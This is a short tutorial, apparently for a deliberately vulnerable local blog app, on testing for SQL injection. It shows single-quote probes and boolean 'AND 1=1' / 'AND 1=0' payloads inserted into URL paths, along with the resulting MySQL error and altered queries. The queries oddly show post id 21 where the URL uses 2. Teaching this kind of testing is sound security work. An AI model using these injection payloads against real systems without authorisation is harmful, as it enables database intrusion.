
# Testing the application for SQLi

Testing the app for finding SQL injections vulnerabilies is quiet simple:
you need to find every variable and check if it is escaped or not before passed to the db engine. Just add a single quote, like this:
```shell
http://localhost:8080/p/2/slug-name-post'
http://localhost:8080/p/2'/slug-name-post
```

You should get and error for response:
```javascript
{
  "status": "Error",
  "message": "ER_PARSE_ERROR: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1"
}
```

This error means that the variable is passed unescaped to the database, getting this query:
```javascript
SELECT posts.id,title,body,date,tags,username,firstname,lastname,avatar 
FROM posts INNER JOIN users ON posts.userId = users.id 
WHERE posts.id = 21'
```

You can also pass a **condition** that is **true**, like this:
```shell
http://localhost:8080/p/2 AND 1=1/slug-name-post
```

This should return the post (id=2) and the query looks like:
```javascript
SELECT posts.id,title,body,date,tags,username,firstname,lastname,avatar 
FROM posts INNER JOIN users ON posts.userId = users.id 
WHERE posts.id = 21 AND 1=1
```

Finally you can pass a **condition** that is **false**, like this:
```shell
http://localhost:8080/p/2 AND 1=0/slug-name-post
```

This should return and error. The query looks like this:
```javascript
SELECT posts.id,title,body,date,tags,username,firstname,lastname,avatar 
FROM posts INNER JOIN users ON posts.userId = users.id 
WHERE posts.id = 21 AND 1=0
```

The app is also vulnerable in other parts like login and search.
Is up to you to check them out.